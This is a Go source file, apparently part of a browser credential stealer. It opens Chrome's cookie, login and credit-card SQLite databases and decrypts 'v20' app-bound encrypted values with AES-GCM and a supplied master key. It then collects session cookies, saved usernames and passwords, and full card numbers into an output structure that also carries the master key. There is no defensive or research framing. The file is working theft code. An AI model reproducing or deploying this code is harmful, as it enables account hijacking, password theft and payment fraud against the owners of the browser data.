package chrome

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"fmt"
)

type Cookie struct {
	Profile string `json:"profile"`
	Host    string `json:"host"`
	Name    string `json:"name"`
	Value   string `json:"value"`
}

type Password struct {
	Profile  string `json:"profile"`
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type Card struct {
	Profile    string `json:"profile"`
	NameOnCard string `json:"name_on_card"`
	Expiration string `json:"expiration"`
	Number     string `json:"number"`
}

type Output struct {
	Timestamp string     `json:"timestamp"`
	MasterKey string     `json:"master_key"`
	Cookies   []Cookie   `json:"cookies"`
	Passwords []Password `json:"passwords"`
	Cards     []Card     `json:"cards"`
}

func decryptAESGCM(key, encrypted []byte) ([]byte, error) {
	if len(encrypted) < 3+12+16 {
		return nil, fmt.Errorf("encrypted data too short")
	}
	nonce := encrypted[3:15]
	ciphertext := encrypted[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

func ExtractCookies(masterKey []byte, dbPath string, profile string) []Cookie {
	var cookies []Cookie
	uri := "file:" + dbPath + "?mode=ro"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return cookies
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		return cookies
	}
	defer rows.Close()

	for rows.Next() {
		var host, name string
		var encValue []byte
		if err := rows.Scan(&host, &name, &encValue); err != nil {
			continue
		}

		if len(encValue) < 3 {
			continue
		}

		prefix := string(encValue[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encValue)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			value := base64.StdEncoding.EncodeToString(decrypted)
			cookies = append(cookies, Cookie{
				Profile: profile,
				Host:    host,
				Name:    name,
				Value:   value,
			})
		}
	}

	return cookies
}

func ExtractPasswords(masterKey []byte, dbPath string, profile string) []Password {
	var passwords []Password
	uri := "file:" + dbPath + "?mode=ro"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return passwords
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return passwords
	}
	defer rows.Close()

	for rows.Next() {
		var url, username string
		var encPassword []byte
		if err := rows.Scan(&url, &username, &encPassword); err != nil {
			continue
		}

		if len(encPassword) < 3 {
			continue
		}

		prefix := string(encPassword[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encPassword)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			passwords = append(passwords, Password{
				Profile:  profile,
				URL:      url,
				Username: username,
				Password: string(decrypted),
			})
		}
	}

	return passwords
}

func ExtractCards(masterKey []byte, dbPath string, profile string) []Card {
	var cards []Card
	uri := "file:" + dbPath + "?mode=ro"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return cards
	}
	defer db.Close()

	rows, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
	if err != nil {
		return cards
	}
	defer rows.Close()

	for rows.Next() {
		var nameOnCard string
		var expMonth, expYear int
		var encCardNumber []byte
		if err := rows.Scan(&nameOnCard, &expMonth, &expYear, &encCardNumber); err != nil {
			continue
		}

		if len(encCardNumber) < 3 {
			continue
		}

		prefix := string(encCardNumber[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encCardNumber)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			cards = append(cards, Card{
				Profile:    profile,
				NameOnCard: nameOnCard,
				Expiration: fmt.Sprintf("%02d/%d", expMonth, expYear),
				Number:     string(decrypted),
			})
		}
	}

	return cards
}
